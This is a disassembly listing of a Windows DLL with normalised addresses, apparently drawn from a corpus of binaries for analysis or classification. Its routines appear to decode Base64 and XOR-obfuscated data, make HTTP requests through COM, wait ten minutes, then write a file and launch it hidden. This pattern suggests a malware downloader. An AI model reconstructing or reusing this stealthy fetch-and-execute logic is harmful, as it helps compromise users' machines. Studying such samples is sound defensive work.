sub_1000101c
push ebp
mov ebp esp
sub esp 0x24
mov eax [ ebp + 0xc ]
push ebx
push esi
push edi
push 0x3
xor edx edx
pop ecx
xor ebx ebx
div ecx
xor edi edi
cmp [ ebp + 0xc ] ebx
mov [ ebp - 0x14 ] 0x8
mov [ ebp - 0x13 ] 0x4
mov [ ebp - 0x12 ] 0x2
mov [ ebp - 0x11 ] bl
mov [ ebp - 0x1c ] 0x2
mov [ ebp - 0x1b ] 0x4
mov [ ebp - 0x1a ] 0x6
mov [ ebp - 0x19 ] bl
mov [ ebp - 0x8 ] bl
mov [ ebp - 0x7 ] bl
mov [ ebp - 0x6 ] 0x1
mov [ ebp - 0x5 ] 0x2
mov [ ebp - 0xc ] bl
mov [ ebp - 0xb ] 0x1
mov [ ebp - 0xa ] 0x2
mov [ ebp - 0x9 ] 0x2
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x4 ] ebx
mov ecx edx
mov [ ebp - 0x24 ] ecx
jbe r-xdata
mov esi ecx
mov eax [ ebp + 0x10 ]
not ecx
and ecx 0x3
neg esi
sbb esi esi
add eax edi
and esi ecx
push esi
push 0x3d
push eax
call [ rw-data ]
mov eax [ ebp + 0x10 ]
add esp 0xc
add esi edi
pop edi
mov [ esi + eax ] bl
pop esi
pop ebx
leave
retn 0x10
xor edx edx
mov eax [ ebp - 0x10 ]
cmp eax [ ebp + 0xc ]
je r-xdata
mov eax [ ebp + 0x10 ]
mov [ edi + eax ] 0xa0d
inc edi
inc edi
mov [ ebp - 0x20 ] edi
mov eax [ ebp + 0xc ]
cmp [ ebp - 0x18 ] eax
je r-xdata
movzx eax [ ebp + edx - 0x8 ]
add eax [ ebp - 0x4 ]
mov [ ebp - 0x10 ] eax
mov esi [ ebp + 0xc ]
cmp [ ebp - 0x10 ] esi
jne r-xdata
movzx eax [ ebp + edx - 0xc ]
add eax [ ebp - 0x4 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x10 ]
cmp eax esi
jae r-xdata
cmp [ ebp - 0x18 ] esi
je r-xdata
xor esi esi
mov ecx [ ebp + 0x8 ]
movzx esi [ eax + ecx ]
mov cl [ ebp + edx - 0x14 ]
shl esi cl
jmp r-xdata
add [ ebp - 0x4 ] 0x3
mov eax [ ebp - 0x4 ]
cmp eax [ ebp + 0xc ]
jb r-xdata
xor eax eax
mov ecx [ ebp + 0x8 ]
movzx eax [ eax + ecx ]
mov cl [ ebp + edx - 0x1c ]
shr eax cl
jmp r-xdata
mov eax [ ebp - 0x18 ]
cmp eax [ ebp + 0xc ]
jae r-xdata
movzx eax [ ebp + 0x14 ]
mov esi edi
sub esi [ ebp - 0x20 ]
cmp esi eax
jne r-xdata
mov ecx [ rw-data ]
or eax esi
and eax 0x3f
mov al [ eax + ecx ]
mov ecx [ ebp + 0x10 ]
mov [ edi + ecx ] al
mov ecx [ ebp - 0x24 ]
inc edi
inc edx
cmp edx 0x4
jb r-xdata
sub_10001169
push ebp
mov ebp esp
sub esp 0x1c
and [ ebp - 0xe ] 0x0
and [ ebp - 0x4 ] 0x0
and [ ebp - 0x1c ] 0x0
and [ ebp - 0x1 ] 0x0
push ebx
push edi
mov ebx 0xff
push 0x4
lea eax [ ebp - 0x18 ]
push ebx
push eax
mov [ ebp - 0xc ] 0x2
mov [ ebp - 0xb ] 0x4
mov [ ebp - 0xa ] 0x6
mov [ ebp - 0x10 ] 0x4
mov [ ebp - 0xf ] 0x2
mov [ ebp - 0x3 ] 0x1
mov [ ebp - 0x2 ] 0x2
mov [ ebp - 0x8 ] 0x1
mov [ ebp - 0x7 ] 0x2
mov [ ebp - 0x6 ] 0x3
call [ rw-data ]
mov edi [ ebp + 0x8 ]
and [ ebp - 0x14 ] 0x0
add esp 0xc
cmp [ edi ] 0x0
je r-xdata
mov eax [ ebp + 0x10 ]
mov ecx [ ebp - 0x1c ]
pop edi
pop ebx
mov [ eax ] ecx
leave
retn 0xc
push esi
inc [ ebp - 0x14 ]
mov eax [ ebp - 0x14 ]
cmp [ eax + edi ] 0x0
jne r-xdata
movzx ecx [ ebp - 0x1 ]
cmp [ ebp + ecx - 0x18 ] bl
lea esi [ ebp + ecx - 0x18 ]
jne r-xdata
mov eax [ ebp - 0x14 ]
movzx eax [ eax + edi ]
push eax
push [ rw-data ]
call [ rw-data ]
pop ecx
test eax eax
pop ecx
je r-xdata
pop esi
cmp [ ebp - 0x1 ] 0x4
je r-xdata
sub al [ rw-data ]
inc [ ebp - 0x1 ]
mov [ esi ] al
xor esi esi
mov eax [ ebp - 0x14 ]
mov al [ eax + edi + 0x1 ]
test al al
je r-xdata
inc esi
cmp esi 0x3
jb r-xdata
movzx ecx [ ebp + esi - 0x8 ]
mov dl [ ebp + ecx - 0x18 ]
cmp dl bl
je r-xdata
cmp al 0x3d
jne r-xdata
movzx eax [ ebp + esi - 0x4 ]
mov al [ ebp + eax - 0x18 ]
cmp al bl
je r-xdata
and [ ebp - 0x1 ] 0x0
push 0x4
lea eax [ ebp - 0x18 ]
push ebx
push eax
call [ rw-data ]
add esp 0xc
movzx ecx [ ebp + esi - 0xc ]
shl al cl
mov cl [ ebp + esi - 0x10 ]
shr dl cl
mov ecx [ ebp + 0xc ]
or al dl
mov edx [ ebp - 0x1c ]
inc [ ebp - 0x1c ]
mov [ edx + ecx ] al
sub_10001287
mov eax [ esp + 0x8 ]
push esi
push 0x3
xor edx edx
pop ecx
div ecx
movzx esi [ rw-data ]
xor edx edx
lea ecx [ eax * 4 + 0x4 ]
mov eax ecx
div esi
lea eax [ ecx + eax * 2 + 0x2 ]
push eax
push 0x8
push [ rw-data ]
call [ rw-data ]
mov esi eax
mov al [ rw-data ]
push eax
push esi
push [ esp + 0x14 ]
push [ esp + 0x14 ]
call sub_1000101c
mov eax [ esp + 0x10 ]
mov [ eax ] esi
pop esi
retn 0xc
sub_100012da
push esi
push [ esp + 0x8 ]
call [ rw-data ]
sar eax 0x2
lea eax [ eax + eax * 2 + 0x1 ]
push eax
push 0x8
push [ rw-data ]
call [ rw-data ]
mov esi eax
push [ esp + 0xc ]
push esi
push [ esp + 0x10 ]
call sub_10001169
mov eax [ esp + 0x10 ]
mov [ eax ] esi
pop esi
retn 0xc
sub_1000133f
push ebp
mov ebp esp
sub esp 0xb0
push esi
mov esi [ ebp + 0x8 ]
push edi
mov edi [ esi ]
lea eax [ esi + 0x4 ]
push eax
lea eax [ ebp - 0xb0 ]
push eax
call sub_10001315
mov eax edi
add esi 0xc
and al 0xf
mov ecx edi
neg al
sbb eax eax
neg eax
shr ecx 0x4
add eax ecx
push eax
lea eax [ ebp - 0xb0 ]
push eax
push esi
call sub_10001327
mov eax [ ebp + 0xc ]
mov [ eax ] esi
mov eax edi
pop edi
pop esi
leave
retn 0x8
sub_1000138e
push ebp
mov ebp esp
sub esp 0x20
mov ecx [ ebp + 0x10 ]
push ebx
push esi
push edi
push 0x7
mov eax ecx
xor edx edx
pop esi
div esi
xor edx edx
mov ebx eax
mov eax [ ebp + 0xc ]
add eax ecx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x4 ] ebx
div esi
mov esi [ ebp + 0x14 ]
cmp ebx eax
mov [ ebp - 0x1c ] eax
jae r-xdata
mov eax [ ebp + 0x10 ]
push 0x7
xor edx edx
pop edi
div edi
mov ecx ebx
mov eax [ ebp - 0x20 ]
sub ecx [ ebp - 0x10 ]
neg ecx
sbb ecx ecx
not ecx
and ecx edx
xor edx edx
div edi
mov [ ebp + 0x14 ] ecx
cmp ecx edx
mov [ ebp - 0x1c ] edx
jae r-xdata
push 0x7
mov eax ecx
xor edx edx
pop ecx
div ecx
mov eax ebx
mov ecx [ ebp + 0x8 ]
imul eax eax 0x7
lea eax [ eax + ecx - 0x2 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x14 ] edx
pop edi
pop esi
pop ebx
leave
retn 0x10
mov al bl
mov dl 0x7
imul dl
imul ebx ebx 0x7
mov [ ebp + 0xf ] al
mov eax [ ebp + 0x8 ]
lea edi [ ecx + 0x2 ]
lea eax [ ebx + eax - 0x2 ]
mov [ ebp - 0x8 ] edi
mov [ ebp + 0x8 ] eax
add [ ebp - 0x8 ] 0x7
inc ebx
cmp ebx [ ebp - 0x1c ]
mov [ ebp - 0x4 ] ebx
jb r-xdata
mov al bl
mov dl 0x7
imul dl
lea edi [ ecx + 0x2 ]
mov [ ebp + 0xf ] al
mov [ ebp - 0xc ] edi
mov eax [ ebp + 0x8 ]
push 0x7
add eax edi
xor edx edx
mov [ ebp - 0x20 ] eax
lea eax [ edi + 0x1 ]
pop ebx
div ebx
mov bl cl
push 0x7
add bl [ ebp + 0xf ]
mov al [ edx + esi ]
xor edx edx
imul bl
mov bl al
mov eax edi
pop edi
div edi
mov edi [ ebp - 0x8 ]
push 0x7
mov al [ edi + esi - 0x2 ]
add al [ ebp - 0x4 ]
add bl [ edx + esi ]
mov dl 0x3
imul dl
mov [ ebp + 0x13 ] bl
mov bl al
add bl cl
lea eax [ edi - 0x1 ]
xor edx edx
pop ecx
div ecx
mov cl [ ebp + 0x13 ]
mov eax [ ebp - 0x20 ]
shl bl 0x6
add bl [ edx + esi ]
xor cl bl
xor [ eax ] cl
mov ecx [ ebp + 0x14 ]
inc ecx
inc edi
cmp ecx [ ebp - 0x1c ]
mov [ ebp + 0x14 ] ecx
mov [ ebp - 0x8 ] edi
jb r-xdata
mov ecx ebx
sub ecx [ ebp - 0x10 ]
neg ecx
sbb ecx ecx
not ecx
and ecx [ ebp - 0x14 ]
cmp ecx 0x7
mov [ ebp + 0x14 ] ecx
jae r-xdata
mov eax [ ebp - 0x8 ]
push 0x7
add eax edi
xor edx edx
mov [ ebp - 0x18 ] eax
lea eax [ edi + 0x1 ]
pop ebx
add cl [ ebp + 0xf ]
div ebx
push 0x7
mov al [ edx + esi ]
xor edx edx
imul cl
mov cl al
mov eax edi
div ebx
mov al [ esi + edi - 0x2 ]
add al [ ebp - 0x4 ]
add cl [ edx + esi ]
mov dl 0x3
imul dl
mov bl al
lea eax [ edi - 0x1 ]
xor edx edx
pop edi
div edi
add bl [ ebp + 0x14 ]
mov eax [ ebp - 0x18 ]
mov edi [ ebp - 0xc ]
shl bl 0x6
add bl [ edx + esi ]
xor cl bl
xor [ eax ] cl
mov ecx [ ebp + 0x14 ]
inc ecx
inc edi
cmp edi 0x9
mov [ ebp + 0x14 ] ecx
mov [ ebp - 0xc ] edi
jb r-xdata
mov ebx [ ebp - 0x4 ]
sub_10001530
push esi
push 0x2710
call [ rw-data ]
push 0x3
pop esi
push 0x927c0
call [ rw-data ]
test esi esi
jne r-xdata
dec esi
call sub_100018b4
test eax eax
je r-xdata
push 0x1
pop eax
pop esi
retn 0x4
sub_10001578
push ebp
mov ebp esp
sub esp 0x60
push ebx
push esi
lea eax [ ebp - 0x4 ]
push edi
push eax
xor edi edi
push [ ebp + 0x8 ]
mov [ ebp - 0x8 ] edi
mov [ ebp - 0x4 ] edi
call sub_1000133f
push edi
push 0x6
push 0x2
mov esi [ GetProcAddress@IAT ]
push edi
push edi
mov ebx rw-data
push 0x40000000
push ebx
push rw-data
push [ rw-data ]
mov [ ebp + 0x8 ] eax
call esi
call eax
cmp eax 0xffffffff
mov [ ebp - 0xc ] eax
je r-xdata
call [ rw-data ]
mov edi eax
lea ecx [ ebp - 0x8 ]
push edi
push ecx
push [ ebp + 0x8 ]
push [ ebp - 0x4 ]
push eax
push rw-data
push [ rw-data ]
call esi
call eax
push [ ebp - 0xc ]
push rw-data
push [ rw-data ]
call esi
call eax
push 0x44
lea eax [ ebp - 0x60 ]
push edi
push eax
call [ rw-data ]
push 0x10
lea eax [ ebp - 0x1c ]
push edi
push eax
mov [ ebp - 0x60 ] 0x44
mov [ ebp - 0x34 ] 0x80
call [ rw-data ]
add esp 0x18
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x60 ]
push eax
push edi
push edi
push 0x8000000
push edi
push edi
push edi
push edi
push ebx
push rw-data
push [ rw-data ]
call esi
call eax
test eax eax
jne r-xdata
push 0xffffffff
push [ ebp - 0x1c ]
call [ rw-data ]
push ebx
push rw-data
push [ rw-data ]
call esi
call eax
jmp r-xdata
call [ rw-data ]
mov edi eax
mov eax edi
pop edi
pop esi
pop ebx
leave
retn 0x4
sub_1000168a
push ebp
mov ebp esp
sub esp 0xc
or [ ebp - 0xc ] 0xffffffff
and [ ebp - 0x8 ] 0x0
push esi
lea eax [ ebp - 0x8 ]
push edi
push eax
push [ ebp + 0x8 ]
call sub_1000133f
mov edi [ ebp - 0x8 ]
push edi
call [ rw-data ]
lea esi [ eax + edi + 0x1 ]
push esi
call [ rw-data ]
and [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x4 ]
lea eax [ eax + esi + 0x1 ]
push 0x0
push ecx
push eax
push esi
push edi
call sub_100016ff
pop edi
pop esi
test eax eax
je r-xdata
push [ ebp - 0x4 ]
call sub_10001000
push [ ebp + 0x8 ]
call sub_10001000
mov eax [ ebp - 0xc ]
leave
retn 0x4
cmp [ ebp - 0x4 ] 0x0
je r-xdata
push [ ebp - 0x4 ]
call sub_10001578
mov [ ebp - 0xc ] eax
sub_100016ff
mov eax sub_1000285a
call _EH_prolog
sub esp 0x118
push ebx
push esi
xor ebx ebx
push 0x4
mov [ ebp - 0x24 ] 0x1
mov [ ebp - 0x18 ] ebx
call ??2@YAPAXI@Z
mov esi eax
pop ecx
mov [ ebp - 0x20 ] esi
cmp esi ebx
mov [ ebp - 0x4 ] ebx
je r-xdata
mov [ ebp - 0x10 ] ebx
push ebx
mov [ esi ] ebx
call [ rw-data ]
mov [ ebp - 0x10 ] esi
jmp r-xdata
cmp [ ebp - 0x10 ] ebx
pop esi
pop ebx
je r-xdata
push [ ebp + 0x10 ]
lea eax [ ebp - 0x124 ]
push rw-data
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push eax
call sub_1000195a
add esp 0x14
lea eax [ ebp - 0x14 ]
mov ecx [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x124 ]
push eax
call sub_10001c24
test eax eax
je r-xdata
mov ecx [ ebp - 0x10 ]
or [ ebp - 0x4 ] 0xffffffff
call sub_100019b7
test eax eax
je r-xdata
mov ecx [ ebp - 0xc ]
mov eax [ ebp - 0x24 ]
mov [ fs : 0x0 ] ecx
leave
retn 0x14
mov ecx [ ebp - 0x10 ]
call sub_10001a57
push [ ebp - 0x10 ]
call ??3@YAXPAX@Z
pop ecx
cmp [ ebp - 0x14 ] 0x4
jbe r-xdata
mov [ ebp - 0x24 ] ebx
jmp r-xdata
cmp [ ebp - 0x18 ] ebx
je r-xdata
mov eax [ ebp - 0x18 ]
push edi
mov [ ebp - 0x1c ] 0x1
lea edi [ eax + 0x4 ]
push [ ebp - 0x18 ]
push ebx
push [ rw-data ]
call [ rw-data ]
mov [ ebp - 0x1c ] ebx
mov [ esi ] bl
inc esi
inc esi
jmp r-xdata
cmp [ ebp + 0x10 ] ebx
je r-xdata
cmp [ ebp - 0x14 ] 0x4
jbe r-xdata
push edi
push rw-data
push [ ebp + 0xc ]
lea eax [ ebp - 0x124 ]
push [ ebp + 0x8 ]
push eax
call sub_1000195a
add esp 0x14
lea eax [ ebp - 0x14 ]
mov ecx [ ebp - 0x10 ]
mov [ ebp + 0x10 ] ebx
push eax
lea eax [ ebp + 0x10 ]
push eax
lea eax [ ebp - 0x124 ]
push eax
call sub_10001c24
test eax eax
jne r-xdata
cmp [ ebp - 0x1c ] ebx
mov edi esi
jne r-xdata
push [ ebp + 0x10 ]
push ebx
push [ rw-data ]
call [ rw-data ]
lea eax [ ebp - 0x20 ]
push eax
lea eax [ ebp - 0x14 ]
push eax
mov eax [ ebp + 0x10 ]
add eax 0x4
push eax
call sub_100012da
mov ecx [ ebp + 0x14 ]
mov eax [ ebp - 0x20 ]
cmp [ ebp + 0x18 ] ebx
mov [ ecx ] eax
je r-xdata
push rw-data
push edi
call [ rw-data ]
mov esi eax
pop ecx
cmp esi ebx
pop ecx
je r-xdata
pop edi
push edi
push rw-data
push [ ebp + 0xc ]
lea eax [ ebp - 0x124 ]
push [ ebp + 0x8 ]
push eax
call sub_1000195a
mov ecx [ ebp - 0x10 ]
add esp 0x14
lea eax [ ebp - 0x124 ]
push eax
call sub_10001d8f
sub_100018b4
push ebp
mov ebp esp
sub esp 0x14
push edi
lea eax [ ebp - 0x4 ]
and [ ebp - 0x4 ] 0x0
push 0x1
push eax
push [ rw-data ]
push rw-data
push rw-data
call sub_100016ff
mov edi eax
test edi edi
je r-xdata
mov eax edi
pop edi
leave
retn
cmp [ ebp - 0x4 ] 0x0
je r-xdata
push esi
push [ ebp - 0x4 ]
call sub_1000168a
mov esi eax
lea eax [ ebp - 0x14 ]
push esi
push rw-data
push eax
call [ rw-data ]
add esp 0xc
lea eax [ ebp - 0x14 ]
push eax
call [ rw-data ]
push eax
lea eax [ ebp - 0x14 ]
push eax
call sub_10001e1b
test esi esi
pop esi
jne r-xdata
push rw-data
call [ LoadLibraryA@IAT ]
call [ rw-data ]
push eax
lea eax [ ebp - 0x14 ]
push rw-data
push eax
call [ rw-data ]
add esp 0xc
lea eax [ ebp - 0x14 ]
push eax
call [ rw-data ]
push eax
lea eax [ ebp - 0x14 ]
push eax
call sub_10001e1b
sub_1000195a
push ebp
mov ebp esp
sub esp 0x80
push esi
mov esi 0x80
push esi
lea eax [ ebp - 0x80 ]
push 0x0
push eax
call [ rw-data ]
push [ ebp + 0x18 ]
lea eax [ ebp - 0x80 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push rw-data
push eax
call [ rw-data ]
push esi
push 0x0
push [ ebp + 0x8 ]
call [ rw-data ]
add esp 0x30
lea eax [ ebp - 0x80 ]
push esi
push [ ebp + 0x8 ]
push 0xffffffff
push eax
push 0x0
push 0x0
call [ rw-data ]
pop esi
leave
retn
sub_100019b7
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
push edi
mov [ ebp - 0x10 ] ecx
call [ rw-data ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x10 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0xc ]
push eax
lea eax [ r--data ]
push eax
mov eax 0x4000
mov ebx 0x4
or eax ebx
push eax
xor eax eax
push eax
lea eax [ r--data ]
push eax
jmp r-xdata
call sub_100019f6
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
xor eax eax
mov eax [ ebp - 0x10 ]
cmp [ eax ] 0x0
je r-xdata
push 0x0
mov eax [ ebp - 0x10 ]
mov eax [ eax ]
mov ecx [ ebp - 0x10 ]
mov ecx [ ecx ]
mov ecx [ ecx ]
push eax
call [ ecx + 0xa4 ]
push 0x0
mov eax [ ebp - 0x10 ]
mov eax [ eax ]
mov ecx [ ebp - 0x10 ]
mov ecx [ ecx ]
mov ecx [ ecx ]
push eax
call [ ecx + 0xe8 ]
push [ ebp - 0x4 ]
call [ rw-data ]
push 0x1
pop eax
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
sub_10001a57
push esi
mov esi ecx
mov eax [ esi ]
push eax
mov ecx [ eax ]
call [ ecx + 0x80 ]
mov eax [ esi ]
test eax eax
je r-xdata
call [ rw-data ]
pop esi
retn
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
and [ esi ] 0x0
sub_10001a7c
push ebp
mov ebp esp
sub esp 0x3c
push esi
push edi
push [ ebp + 0x8 ]
mov edi ecx
call [ rw-data ]
mov [ ebp + 0x8 ] eax
lea eax [ ebp - 0x4 ]
push eax
xor esi esi
push [ ebp + 0x10 ]
mov [ ebp - 0x2c ] si
mov [ ebp - 0x3c ] 0x3
mov [ ebp - 0x34 ] 0x2
push [ ebp + 0xc ]
mov [ ebp - 0x4 ] esi
call sub_10001287
cmp [ ebp - 0x4 ] esi
jne r-xdata
push ebx
push [ ebp - 0x4 ]
call [ rw-data ]
mov ebx eax
mov [ ebp - 0x1c ] 0x2011
push ebx
push esi
push 0x11
call [ rw-data ]
lea ecx [ ebp - 0xc ]
mov [ ebp - 0x14 ] eax
push ecx
push eax
call [ rw-data ]
mov esi eax
test esi esi
jne r-xdata
call [ rw-data ]
jmp r-xdata
push [ ebp - 0x14 ]
call [ rw-data ]
mov eax esi
pop ebx
push ebx
push [ ebp - 0x4 ]
push [ ebp - 0xc ]
call [ rw-data ]
add esp 0xc
push [ ebp - 0x14 ]
call [ rw-data ]
push [ ebp - 0x4 ]
call sub_10001000
lea edx [ ebp - 0x2c ]
mov eax [ edi ]
push edx
lea edx [ ebp - 0x1c ]
push edx
lea edx [ ebp - 0x2c ]
mov ecx [ eax ]
push edx
lea edx [ ebp - 0x3c ]
push edx
push [ ebp + 0x8 ]
push eax
call [ ecx + 0x2c ]
mov esi eax
neg esi
sbb esi esi
inc esi
je r-xdata
pop edi
pop esi
leave
retn 0xc
push [ ebp + 0x8 ]
call [ rw-data ]
mov ecx edi
call sub_10001de9
push [ ebp + 0x8 ]
call [ rw-data ]
mov eax [ edi ]
lea edx [ ebp - 0x8 ]
push edx
push eax
mov ecx [ eax ]
call [ ecx + 0x48 ]
mov esi eax
xor edi edi
cmp esi edi
jne r-xdata
mov eax [ ebp - 0x8 ]
cmp eax edi
je r-xdata
mov ecx [ eax ]
lea edx [ ebp + 0xc ]
push edx
push r--data
push eax
call [ ecx ]
mov esi eax
cmp esi edi
jne r-xdata
cmp [ ebp + 0xc ] edi
je r-xdata
mov eax [ ebp - 0x8 ]
push eax
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax [ ebp + 0xc ]
lea edx [ ebp + 0x10 ]
push edx
push eax
mov ecx [ eax ]
call [ ecx + 0x24 ]
mov esi eax
cmp esi edi
jne r-xdata
mov eax [ ebp + 0xc ]
push eax
mov ecx [ eax ]
call [ ecx + 0x8 ]
cmp [ ebp + 0x10 ] edi
je r-xdata
push edi
call [ rw-data ]
mov [ ebp + 0x8 ] eax
mov eax [ ebp + 0x10 ]
lea edx [ ebp + 0x8 ]
mov ecx [ eax ]
push edx
push eax
call [ ecx + 0xf0 ]
mov esi eax
cmp esi edi
jne r-xdata
push [ ebp + 0x8 ]
call [ rw-data ]
mov eax [ ebp + 0x10 ]
push eax
mov ecx [ eax ]
call [ ecx + 0x8 ]
cmp [ ebp + 0x8 ] edi
je r-xdata
or esi 0xffffffff
push rw-data
push [ ebp + 0x8 ]
call [ rw-data ]
cmp eax [ ebp + 0x8 ]
pop ecx
pop ecx
je r-xdata
sub_10001c24
push ebp
mov ebp esp
sub esp 0x30
push esi
push edi
push [ ebp + 0x8 ]
mov edi ecx
call [ rw-data ]
lea edx [ ebp - 0x20 ]
mov [ ebp + 0x8 ] eax
push edx
lea edx [ ebp - 0x20 ]
mov eax [ edi ]
push edx
lea edx [ ebp - 0x20 ]
xor esi esi
push edx
lea edx [ ebp - 0x30 ]
push edx
mov [ ebp - 0x20 ] si
push [ ebp + 0x8 ]
mov [ ebp - 0x30 ] 0x3
mov [ ebp - 0x28 ] 0x2
mov ecx [ eax ]
push eax
call [ ecx + 0x2c ]
cmp eax esi
mov [ ebp - 0x4 ] eax
jne r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
leave
retn 0xc
mov ecx edi
call sub_10001de9
push [ ebp + 0x8 ]
call [ rw-data ]
mov edi [ edi ]
lea ecx [ ebp - 0x10 ]
push ecx
push edi
mov eax [ edi ]
call [ eax + 0x48 ]
cmp eax esi
mov [ ebp - 0x4 ] eax
jne r-xdata
mov eax [ ebp - 0x10 ]
cmp eax esi
je r-xdata
mov ecx [ eax ]
lea edx [ ebp - 0xc ]
push edx
push r--data
push eax
call [ ecx ]
cmp eax esi
mov [ ebp - 0x4 ] eax
jne r-xdata
mov eax [ ebp - 0xc ]
push eax
mov ecx [ eax ]
call [ ecx + 0x8 ]
cmp [ ebp - 0xc ] esi
je r-xdata
mov eax [ ebp - 0x10 ]
push eax
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax [ ebp - 0xc ]
lea edx [ ebp - 0x8 ]
push edx
push eax
mov ecx [ eax ]
call [ ecx + 0x24 ]
cmp eax esi
mov [ ebp - 0x4 ] eax
jne r-xdata
cmp [ ebp - 0x8 ] esi
je r-xdata
push ebx
push esi
call [ rw-data ]
mov [ ebp + 0x8 ] eax
mov eax [ ebp - 0x8 ]
lea edx [ ebp + 0x8 ]
mov ecx [ eax ]
push edx
push eax
call [ ecx + 0xf0 ]
cmp eax esi
mov [ ebp - 0x4 ] eax
jne r-xdata
push [ ebp + 0x8 ]
call [ rw-data ]
mov eax [ ebp - 0x8 ]
push eax
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop ebx
push esi
push esi
push esi
push esi
push 0xffffffff
push [ ebp + 0x8 ]
push esi
push esi
call [ rw-data ]
mov ebx [ ebp + 0x10 ]
cmp eax esi
mov [ ebx ] eax
jbe r-xdata
push eax
push 0x8
push [ rw-data ]
call [ rw-data ]
mov edi [ ebp + 0xc ]
push esi
push esi
mov [ edi ] eax
push [ ebx ]
push eax
push 0xffffffff
push [ ebp + 0x8 ]
push esi
push esi
call [ rw-data ]
push rw-data
push [ edi ]
call [ rw-data ]
cmp eax [ edi ]
pop ecx
pop ecx
je r-xdata
or [ ebp - 0x4 ] 0xffffffff
sub_10001d8f
push ebp
mov ebp esp
sub esp 0x20
push ebx
push esi
push edi
mov esi ecx
push [ ebp + 0x8 ]
call [ rw-data ]
lea edx [ ebp - 0x10 ]
and [ ebp - 0x10 ] 0x0
push edx
lea edx [ ebp - 0x10 ]
push edx
lea edx [ ebp - 0x10 ]
mov edi eax
mov eax [ esi ]
push edx
lea edx [ ebp - 0x20 ]
mov [ ebp - 0x20 ] 0x3
mov [ ebp - 0x18 ] 0x2
mov ecx [ eax ]
push edx
push edi
push eax
call [ ecx + 0x2c ]
mov ecx esi
mov ebx eax
call sub_10001de9
push edi
call [ rw-data ]
pop edi
mov eax ebx
pop esi
pop ebx
leave
retn 0x4
sub_10001de9
push ebp
mov ebp esp
push ecx
push esi
mov esi ecx
mov al 0x1
pop esi
leave
retn
push 0xfa
call [ rw-data ]
cmp [ ebp - 0x4 ] 0x4
jne r-xdata
mov eax [ esi ]
lea edx [ ebp - 0x4 ]
push edx
push eax
mov ecx [ eax ]
call [ ecx + 0xe0 ]
cmp [ ebp - 0x4 ] 0x4
je r-xdata
sub_10001e1b
mov eax sub_10002871
call _EH_prolog
sub esp 0x124
push ebx
push esi
push edi
mov [ ebp - 0x114 ] 0x1
mov [ ebp - 0x118 ] 0x54af97e1
movd mmx0 [ ebp - 0x118 ]
pslld mmx0 0x2
movd [ ebp - 0x118 ] mmx0
jmp r-xdata
push 0x4
call ??2@YAPAXI@Z
pop ecx
mov [ ebp - 0x120 ] eax
and [ ebp - 0x4 ] 0x0
cmp [ ebp - 0x120 ] 0x0
je r-xdata
and [ ebp - 0x12c ] 0x0
mov eax [ ebp - 0x120 ]
and [ eax ] 0x0
push 0x0
call [ rw-data ]
mov eax [ ebp - 0x120 ]
mov [ ebp - 0x12c ] eax
jmp r-xdata
and [ ebp - 0x114 ] 0x0
push [ rw-data ]
push rw-data
push rw-data
push rw-data
lea eax [ ebp - 0x110 ]
push eax
call sub_1000195a
add esp 0x14
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea eax [ ebp - 0x110 ]
push eax
mov ecx [ ebp - 0x10 ]
call sub_10001a7c
test eax eax
je r-xdata
mov eax [ ebp - 0x12c ]
mov [ ebp - 0x11c ] eax
or [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x11c ]
mov [ ebp - 0x10 ] eax
mov ecx [ ebp - 0x10 ]
call sub_100019b7
test eax eax
je r-xdata
and [ ebp - 0x130 ] 0x0
mov ecx [ ebp - 0x124 ]
call sub_10001a57
push 0x1
pop eax
and eax 0x1
test eax eax
je r-xdata
jmp r-xdata
and [ ebp - 0x114 ] 0x0
mov eax [ ebp - 0x124 ]
mov [ ebp - 0x130 ] eax
jmp r-xdata
push [ ebp - 0x124 ]
call ??3@YAXPAX@Z
pop ecx
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x128 ] eax
mov eax [ ebp - 0x128 ]
mov [ ebp - 0x124 ] eax
cmp [ ebp - 0x124 ] 0x0
je r-xdata
mov eax [ ebp - 0x114 ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn 0x8
sub_10001f7c
push ebp
mov ebp esp
sub esp 0x24
push ebx
push esi
push edi
mov [ ebp - 0x24 ] 0x54af97e1
movd mmx0 [ ebp - 0x24 ]
pslld mmx0 0x2
movd [ ebp - 0x24 ] mmx0
jmp r-xdata
push rw-data
call [ LoadLibraryA@IAT ]
mov [ rw-data ] eax
push rw-data
push [ rw-data ]
call [ GetProcAddress@IAT ]
call eax
mov [ rw-data ] eax
push rw-data
push [ rw-data ]
call [ GetProcAddress@IAT ]
mov [ rw-data ] eax
push rw-data
push [ rw-data ]
call [ GetProcAddress@IAT ]
mov [ rw-data ] eax
push rw-data
push [ rw-data ]
call [ GetProcAddress@IAT ]
mov [ rw-data ] eax
push rw-data
push [ rw-data ]
call [ GetProcAddress@IAT ]
mov [ rw-data ] eax
push rw-data
push [ rw-data ]
call [ GetProcAddress@IAT ]
mov [ rw-data ] eax
push rw-data
push [ rw-data ]
call [ GetProcAddress@IAT ]
mov [ rw-data ] eax
push rw-data
push [ rw-data ]
call [ GetProcAddress@IAT ]
mov [ rw-data ] eax
